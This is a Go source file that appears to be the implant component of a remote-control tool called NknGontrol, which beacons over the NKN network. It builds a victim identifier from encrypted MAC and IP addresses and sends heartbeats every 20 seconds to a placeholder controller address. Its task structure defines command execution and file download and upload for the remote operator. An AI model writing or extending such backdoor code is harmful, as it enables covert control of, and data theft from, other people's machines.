package main

import (
	"NknGontrol/module"
	"NknGontrol/module/cipher"
	"NknGontrol/module/getmac"
	"NknGontrol/module/nkntransfer"
	"encoding/base64"
	"time"
)

// 配置shadowTrap地址
const (
	shadowTrap = "xxxxxxxxxxxx"
	Aeskey     = "xxxxxxx"

	heartBeatTime = 20
	TransThreads  = 4
)

// PreyStat struct
type PreyStat struct {
	Status  int    `json:"status"` //0不执行 1执行命令 2下载文件 3上传文件
	Task    string `json:"task"`
	Result  string `json:"result"`
	FileHex string `json:"filehex"`
	FileLo  string `json:"filelo"`
}

// InitPrey 初始化及心跳包结构体
type InitPrey struct {
	UDID string
}

// PreyInfo 申明prey全局状态
var PreyInfo InitPrey

func init() {

	PreyInfo.UDID = MakeClientName()
	go HeartBeat()

}

// HeartBeat 心跳包
func HeartBeat() {
	for {
		nkntransfer.Sender(PreyInfo.UDID, shadowTrap, "")
		time.Sleep(heartBeatTime * time.Second)
	}
}

// MakeClientName 设置客户端名称
func MakeClientName() string {
	macipbyte, _ := cipher.AesCbcEncrypt([]byte(getmac.GetMacAddrs()[0]+getmac.GetIPs()[0]), []byte(module.AesKey))
	return base64.StdEncoding.EncodeToString(macipbyte)
}
